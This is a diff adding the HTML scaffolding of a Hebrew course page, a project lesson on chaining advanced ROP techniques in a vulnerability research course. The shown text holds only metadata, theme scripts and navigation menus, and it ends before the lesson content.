@@ -1,0 +1,3354 @@
+
+<!doctype html>
+<html lang="he" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="לאורך פרק 6 פירקנו את הטכניקות המתקדמות של ROP אחת-אחת: הזזת מחסנית - stack pivot, הגאדג'ט האוניברסלי ret2csu, קריאת סיגנל מזויפת - SROP, ופתרון סמלים...">
+      
+      
+        <meta name="author" content="עמית פנחסי">
+      
+      
+        <link rel="canonical" href="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98/">
+      
+      
+        <link rel="prev" href="../../6.4%20-%20ret2dlresolve/6.4%20-%20ret2dlresolve%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/">
+      
+      
+        <link rel="next" href="../../../7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS הזנת" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="הזנת RSS של תוכן מעודכן" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>6.5 - פרויקט שרשרת ROP מורכבת - פרויקט - עמית טק</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Heebo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/themes.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  
+
+  <!-- Primary Meta Tags (name="description" is rendered by base.html from page.meta.description;
+       og:type/title/description/url and twitter:card/title/description are injected per-page by
+       the built-in social plugin - see material/plugins/social/templates/default.yml) -->
+  <meta name="author" content="עמית פנחסי">
+  <meta name="robots" content="index, follow">
+  <meta property="og:locale" content="he_IL">
+  <meta property="og:site_name" content="עמית טק">
+
+  
+  
+
+  <!-- Organization / WebSite structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "@id": "https://amittech.dev/#organization",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "logo": "https://amittech.dev/amittech.png",
+        "founder": {
+          "@type": "Person",
+          "name": "עמית פנחסי"
+        },
+        "sameAs": ["https://discord.gg/ef5PQAAca2"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://amittech.dev/#website",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "description": "קורסי סייבר, תכנות, IT ומחשבים בחינם בעברית - מעל 2000 שעות לימוד עם תרגול מעשי. מתאים למתחילים ולמתקדמים.",
+        "inLanguage": "he",
+        "publisher": { "@id": "https://amittech.dev/#organization" }
+      },
+      {
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "עמית טק",
+            "item": "https://amittech.dev/"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "6.5 - \u05e4\u05e8\u05d5\u05d9\u05e7\u05d8 \u05e9\u05e8\u05e9\u05e8\u05ea ROP \u05de\u05d5\u05e8\u05db\u05d1\u05ea - \u05e4\u05e8\u05d5\u05d9\u05e7\u05d8",
+            "item": "https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98/"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
+  <!-- Apply saved theme before first paint (prevents flash of default theme) -->
+  <script>
+    (function () {
+      /* Dark-based theme ids; everything else is treated as a light (default) scheme. */
+      var DARK = {
+        midnight: 1, dracula: 1, nord: 1, gruvbox: 1, "solarized-dark": 1,
+        matrix: 1, amber: 1, synthwave: 1, ocean: 1, emerald: 1, rose: 1, violet: 1
+      };
+      var id;
+      try { id = localStorage.getItem("am-theme"); } catch (e) { id = null; }
+      if (!id) id = "light";
+      var root = document.documentElement;
+      root.setAttribute("data-theme", id);
+      root.setAttribute("data-md-color-scheme", DARK[id] ? "slate" : "default");
+    })();
+  </script>
+
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="6.5 - פרויקט שרשרת ROP מורכבת - פרויקט - עמית טק" />
+<meta property="og:description" content="לאורך פרק 6 פירקנו את הטכניקות המתקדמות של ROP אחת-אחת: הזזת מחסנית - stack pivot, הגאדג'ט האוניברסלי ret2csu, קריאת סיגנל מזויפת - SROP, ופתרון סמלים..." />
+<meta property="og:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="6.5 - פרויקט שרשרת ROP מורכבת - פרויקט - עמית טק" />
+<meta property="twitter:description" content="לאורך פרק 6 פירקנו את הטכניקות המתקדמות של ROP אחת-אחת: הזזת מחסנית - stack pivot, הגאדג'ט האוניברסלי ret2csu, קריאת סיגנל מזויפת - SROP, ופתרון סמלים..." />
+<meta property="twitter:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA/6.5%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A9%D7%A8%D7%A9%D7%A8%D7%AA%20ROP%20%D7%9E%D7%95%D7%A8%D7%9B%D7%91%D7%AA%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98.png" />
+</head>
+  
+  
+    <body dir="rtl">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#-chain-rop-srop" class="md-skip">
+          לדלג לתוכן
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="כותרת עליונה">
+    <a href="../../../.." title="עמית טק" class="md-header__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            עמית טק
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              6.5 - פרויקט שרשרת ROP מורכבת - פרויקט
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="חיפוש" placeholder="חיפוש" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="חיפוש">
+        
+        <button type="reset" class="md-search__icon md-icon" title="ניקוי" aria-label="ניקוי" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            אתחול חיפוש
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="לשוניות" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  דף הבית
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  מי אני
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  בלוג
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  תכנות
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  רשתות ומערכות הפעלה
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  אבטחת מידע וסייבר
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  מחקר ו-Low Level
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ניווט" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="עמית טק" class="md-nav__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    עמית טק
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    דף הבית
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מי אני
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../blog/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    בלוג
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    רשתות ומערכות הפעלה
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    אבטחת מידע וסייבר
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר ו-Low Level
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר ו-Low Level
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ליבת המחשב
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר חולשות
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר חולשות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../0%20-%20%D7%94%D7%A7%D7%93%D7%9E%D7%94%20%D7%95%D7%AA%D7%A9%D7%AA%D7%99%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0   הקדמה ותשתית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../1%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%A4%D7%A9%D7%95%D7%98%D7%95%D7%AA%20%D7%95%D7%91%D7%90%D7%92%D7%99%D7%9D%20%D7%9C%D7%95%D7%92%D7%99%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1   חולשות פשוטות ובאגים לוגיים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../2%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20%D7%97%D7%95%D7%A6%D7%A5%20%D7%A2%D7%9C%20%D7%94%D7%9E%D7%97%D7%A1%D7%A0%D7%99%D7%AA/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2   גלישת חוצץ על המחסנית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../3%20-%20Shellcode/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3   Shellcode
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
